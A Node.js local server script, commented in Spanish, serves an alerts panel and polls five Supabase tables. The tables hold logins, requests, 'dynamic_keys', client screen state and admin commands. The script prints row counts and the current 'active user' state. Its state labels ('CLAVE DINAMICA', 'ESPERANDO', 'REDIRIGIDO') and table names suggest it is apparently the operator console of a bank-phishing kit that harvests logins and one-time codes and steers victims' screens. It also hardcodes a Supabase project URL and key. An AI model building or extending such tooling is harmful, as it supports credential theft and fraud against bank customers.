// ============================================================
//  Servidor local mínimo para PROBAR el panel de alertas
//  Sirve panel.html + monitor.js con módulos nativos de Node
//  (sin dependencias). No interfiere con server.js del proyecto.
//
//  Incluye MONITOR EN CONSOLA (CMD) en tiempo real: consulta las
//  5 tablas de Supabase y las muestra ordenadas.
//
//  Uso:   node servidor-local.js
//  Puerto personalizado:  set PORT=8080 && node servidor-local.js
//  Intervalo del monitor: set POLL=5000 && node servidor-local.js
// ============================================================
"use strict";

const http = require("http");
const fs = require("fs");
const path = require("path");

const ROOT = __dirname;                       // carpeta bcbia
const PORT = Number(process.env.PORT) || 5177;
const MONITOR_MS = Number(process.env.POLL) || 3000; // refresco del monitor CMD

// ============================================================
//  CREDENCIALES SUPABASE (mismas que usa el panel)
//  Solo lectura para pintar el estado de las tablas en CMD.
// ============================================================
const SUPABASE_URL = "https://yiozdjhcbragqmexiovn.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_Vl47Kr0iSj05_vy1BRU2jA_29BEfQAP";
const SUPABASE_REST = SUPABASE_URL + "/rest/v1/";

// Las 5 tablas. NINGUNA se borra ni se modifica: solo se consultan.
const TABLES = [
  { name: "logins",           etiqueta: "logins" },
  { name: "solicitudes",      etiqueta: "solicitudes" },
  { name: "dynamic_keys",     etiqueta: "dynamic_keys" },
  { name: "client_screen_state", etiqueta: "client_screen_state" },
  { name: "admin_commands",   etiqueta: "admin_commands" }
];

const MIME = {
  ".html": "text/html; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".ico": "image/x-icon",
};

// ==================== Utilidades de formato (ASCII seguro en CMD) ====================
function ahora() {
  return new Date().toLocaleTimeString("es-CO", { hour12: false });
}

function padEnd(s, w) {
  s = String(s == null ? "" : s);
  while (s.length < w) s += " ";
  return s;
}

function haceCuanto(iso) {
  if (!iso) return "nunca";
  var ts = new Date(iso).getTime();
  if (isNaN(ts)) return "nunca";
  var s = Math.max(0, Math.round((Date.now() - ts) / 1000));
  if (s < 2) return "ahora";
  if (s < 60) return "hace " + s + " s";
  return "hace " + Math.floor(s / 60) + " min";
}

// ==================== Consultas a Supabase (REST, fetch nativo) ====================
// fetch con límite de tiempo: con una VPN/red lenta las consultas no se quedan
// colgadas ni se acumulan, y el monitor conserva su cadencia.
async function fetchConTimeout(url, opciones, ms) {
  const controlador = new AbortController();
  const temporizador = setTimeout(function () { controlador.abort(); }, ms || 5000);
  try {
    return await fetch(url, Object.assign({}, opciones, { signal: controlador.signal }));
  } finally {
    clearTimeout(temporizador);
  }
}

async function countTabla(tabla) {
  // count=exact + Range 0-0 → el total llega en la cabecera Content-Range: "0-0/TOTAL"
  const res = await fetchConTimeout(SUPABASE_REST + tabla + "?select=id", {
    headers: {
      apikey: SUPABASE_ANON_KEY,
      Authorization: "Bearer " + SUPABASE_ANON_KEY,
      Prefer: "count=exact",
      Range: "0-0"
    }
  }, 5000);
  if (!res.ok) return "n/a";
  const cr = res.headers.get("content-range") || "";
  const m = cr.match(/\/(\d+)$/);
  return m ? Number(m[1]) : "n/a";
}

async function estadoActivoSupabase() {
  // Fila más reciente de client_screen_state
  const res = await fetchConTimeout(
    SUPABASE_REST + "client_screen_state?select=session_id,username,estado,updated_at&order=updated_at.desc&limit=1",
    { headers: { apikey: SUPABASE_ANON_KEY, Authorization: "Bearer " + SUPABASE_ANON_KEY } },
    5000
  );
  if (!res.ok) return null;
  const data = await res.json();
  return Array.isArray(data) && data.length ? data[0] : null;
}

function resumirSesion(sid) {
  if (!sid) return "---";
  return sid.length > 16 ? sid.slice(0, 4) + "..." + sid.slice(-4) : sid;
}
// ==================== Monitor en consola (CMD) ====================
var ultimoResumen = "";

async function consultarMonitor() {
  try {
    const filas = [];
    for (const t of TABLES) {
      filas.push({ etiqueta: t.etiqueta, total: await countTabla(t.name) });
    }
    const activo = await estadoActivoSupabase();

    const resumen = JSON.stringify({ filas, activo });
    if (resumen === ultimoResumen) return; // sin cambios -> no repetir
    ultimoResumen = resumen;

    const est = activo ? String(activo.estado || "") : "";
    const etiquetaEstado = {
      inicio: "AVISO INICIAL",
      clave: "CLAVE DINAMICA",
      cargando: "CARGA (ESPERANDO)",
      escudo: "ESCUDO DORADO",
      salida: "REDIRIGIDO"
    }[est] || (est ? est.toUpperCase() : "SIN USUARIO");

    const L = [];
    L.push("================================================================");
    L.push("   *** BCBIA MONITOR EN TIEMPO REAL ***   " + ahora());
    L.push("----------------------------------------------------------------");
    L.push(padEnd("TABLA", 22) + " " + padEnd("FILAS", 6) + "  SENAL");
    L.push("----------------------------------------------------------------");
    filas.forEach(function (f) {
      var senal = f.total === "n/a" ? "sin acceso" : "OK";
      L.push(padEnd(f.etiqueta, 22) + " " + padEnd(String(f.total), 6) + "  " + senal);
    });
    L.push("----------------------------------------------------------------");
    if (activo) {
      L.push("USUARIO ACTIVO:  [" + etiquetaEstado + "]");
      L.push("                 usuario: " + (activo.username || "(anonimo)") + "  sesion: " + resumirSesion(activo.session_id));
      L.push("                 ultima senal: " + haceCuanto(activo.updated_at));
    } else {
      L.push("USUARIO ACTIVO:  [SIN USUARIO]");
    }
    L.push("================================================================");
    console.log("\n" + L.join("\n") + "\n");
  } catch (e) {
    // Sin internet / Supabase caído: no romper el servidor.
    if (ultimoResumen !== "error") {
      ultimoResumen = "error";
      console.log("\n[monitor] Sin conexion a Supabase (" + e.message + ")\n");
    }
  }
}

consultarMonitor();
setInterval(consultarMonitor, MONITOR_MS);

// ==================== Servidor HTTP ====================
const server = http.createServer(function (req, res) {
  let urlPath;
  try {
    urlPath = decodeURIComponent((req.url || "/").split("?")[0]);
  } catch (e) {
    res.writeHead(400); res.end("URL inválida"); return;
  }
  if (urlPath === "/") urlPath = "/panel.html"; // la raíz abre el panel

  // Seguridad: solo archivos dentro de esta carpeta
  const filePath = path.normalize(path.join(ROOT, urlPath));
  if (!filePath.startsWith(ROOT)) {
    res.writeHead(403, { "Content-Type": "text/plain; charset=utf-8" });
    res.end("403 Prohibido");
    console.log("[" + ahora() + "] " + req.method + " " + urlPath + " -> 403 PROHIBIDO");
    return;
  }

  fs.readFile(filePath, function (err, data) {
    if (err) {
      res.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
      res.end("404 No encontrado: " + urlPath);
      console.log("[" + ahora() + "] " + req.method + " " + urlPath + " -> 404 NO ENCONTRADO");
      return;
    }
    res.writeHead(200, {
      "Content-Type": MIME[path.extname(filePath).toLowerCase()] || "application/octet-stream",
      "Cache-Control": "no-store",
    });
    res.end(data);
    console.log("[" + ahora() + "] " + req.method + " " + urlPath + " -> 200 OK (" + (data.length / 1024).toFixed(1) + " KB)");
  });
});

server.on("error", function (err) {
  console.error("[servidor] ERROR: " + err.message);
  console.error("          Puerto " + PORT + " ocupado. Prueba:  set PORT=8080 && node servidor-local.js");
});

server.listen(PORT, function () {
  console.log("");
  console.log("================================================================");
  console.log("   *** BCBIA - PANEL + MONITOR CMD ***");
  console.log("----------------------------------------------------------------");
  console.log("   Panel:    http://localhost:" + PORT + "/");
  console.log("   Archivos: panel.html + monitor.js");
  console.log("   Monitor:  consultando las 5 tablas cada " + (MONITOR_MS / 1000) + " s");
  console.log("   Detener:  presiona Ctrl+C");
  console.log("================================================================");
  console.log("");
});
